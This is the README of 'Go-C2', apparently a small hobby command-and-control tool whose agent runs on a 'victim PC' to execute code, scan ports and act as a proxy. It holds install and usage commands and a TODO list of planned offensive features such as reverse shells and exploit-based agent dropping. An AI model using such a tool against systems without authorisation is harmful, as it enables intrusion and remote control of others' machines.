

# Go-C2 v0.1

## What is this? 
This is a fairly small tool I wrote that is basically a C2 and an Agent for that C2, additionally the Agent can act as a proxy server when needed.
*Fair warning, the proxy doesn't exactly work that well so take that into account*

## Why? 
Because I was annoyed that metasploit's meterpreters don't have a port scanning option so I implemented one myself


## Features:
* C2 client
* Agent

## Installing:
```sh
git clone https://github.com/mrLochness350/Go-C2.git
cd Go-C2
chmod +x install.sh
./install.sh
```
# Usage:

**On Victim PC**
```sh
$ ./Agent_linux_amd64 -c <C2 Address> -p <C2 Port>
```

**On Attacker PC**
```sh
$ ./C2_linux_amd64 -c <Agent Address> -p <Agent Port>
```


# TODO:

### General:
* Encrypt C2/Agent traffic
* Add 2-way authentication to avoid snooping

### Agent
* Fix proxy problems
* Add extra verbosity
* Add background option
* Make the connection a reverse shell
* Add option to drop into shell and not only execute code via the `shell` argument
* Add option to host the C2 from the Agent as a pivot-point

### C2
* Add multiple host listeners
* Add option to drop Agent via exploits
* Make the cli more interactive
* Execute commands on an Agent from the cli 
* Add Payload Compilation code
